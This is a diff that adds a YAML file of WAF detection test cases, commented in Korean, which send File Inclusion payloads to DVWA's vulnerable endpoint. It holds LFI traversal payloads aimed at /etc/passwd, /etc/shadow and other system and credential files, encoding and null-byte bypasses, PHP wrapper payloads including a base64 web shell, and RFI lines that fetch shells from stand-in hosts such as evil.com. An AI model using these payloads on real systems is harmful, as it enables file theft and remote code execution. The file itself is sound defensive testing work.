@@ -1,0 +1,209 @@
+# =============================================================================
+# File Inclusion (LFI/RFI) Test Cases
+# =============================================================================
+# DVWA의 File Inclusion 취약점을 통해 WAF의 Local/Remote File Inclusion
+# 탐지 능력을 검증합니다.
+# =============================================================================
+
+category: "file_inclusion"
+name: "File Inclusion"
+description: "Local/Remote File Inclusion 공격 탐지 테스트"
+severity: "high"
+icon: "📂"
+
+tests:
+  # --- Local File Inclusion (LFI) ---
+  - id: "lfi-001"
+    description: "LFI - /etc/passwd"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/passwd"
+    severity: "critical"
+
+  - id: "lfi-002"
+    description: "LFI - /etc/shadow"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/shadow"
+    severity: "critical"
+
+  - id: "lfi-003"
+    description: "LFI - /windows/win.ini"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../windows/win.ini"
+    severity: "high"
+
+  - id: "lfi-004"
+    description: "LFI - /var/log/apache2/access.log"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../var/log/apache2/access.log"
+    severity: "high"
+
+  - id: "lfi-005"
+    description: "LFI - /proc/self/environ"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../proc/self/environ"
+    severity: "high"
+
+  # --- LFI 우회 기법 ---
+  - id: "lfi-006"
+    description: "LFI - URL 인코딩 (%2e%2e%2f)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"
+    severity: "high"
+
+  - id: "lfi-007"
+    description: "LFI - 이중 인코딩 (%252e%252e%252f)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd"
+    severity: "medium"
+
+  - id: "lfi-008"
+    description: "LFI - Null Byte Injection %00"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/passwd%00"
+    severity: "high"
+
+  - id: "lfi-009"
+    description: "LFI - 더블 슬래시 //"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "....//....//....//etc/passwd"
+    severity: "medium"
+
+  - id: "lfi-010"
+    description: "LFI - PHP wrapper php://filter"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "php://filter/convert.base64-encode/resource=../../../etc/passwd"
+    severity: "critical"
+
+  - id: "lfi-011"
+    description: "LFI - PHP wrapper php://input"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "php://input"
+    severity: "critical"
+
+  # --- Remote File Inclusion (RFI) ---
+  - id: "rfi-001"
+    description: "RFI - 외부 PHP 쉘"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://evil.com/shell.txt?"
+    severity: "critical"
+
+  - id: "rfi-002"
+    description: "RFI - HTTPS 외부 스크립트"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "https://attacker.com/malicious.php?"
+    severity: "critical"
+
+  - id: "rfi-003"
+    description: "RFI - FTP 프로토콜"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "ftp://attacker.com/shell.txt?"
+    severity: "critical"
+
+  - id: "rfi-004"
+    description: "RFI - PHP wrapper expect://"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "expect://id"
+    severity: "critical"
+
+  # --- LFI with Wrapper variations ---
+  - id: "lfi-012"
+    description: "LFI - php://filter base64 index.php"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "php://filter/convert.base64-encode/resource=index.php"
+    severity: "high"
+
+  - id: "lfi-013"
+    description: "LFI - data:// wrapper"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+    severity: "critical"
+
+  - id: "lfi-014"
+    description: "LFI - /var/log/auth.log (로그 주입)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../var/log/auth.log"
+    severity: "high"
+
+  - id: "lfi-015"
+    description: "LFI - /etc/issue"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/issue"
+    severity: "medium"
+
+  - id: "lfi-016"
+    description: "LFI - /etc/hosts"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/hosts"
+    severity: "medium"
+
+  - id: "lfi-017"
+    description: "LFI - /etc/group"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/group"
+    severity: "medium"
+
+  - id: "lfi-018"
+    description: "LFI - /etc/network/interfaces"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/network/interfaces"
+    severity: "medium"
+
+  - id: "lfi-019"
+    description: "LFI - /etc/nginx/nginx.conf"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/nginx/nginx.conf"
+    severity: "high"
+
+  - id: "lfi-020"
+    description: "LFI - .git/config 노출"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../.git/config"
+    severity: "high"
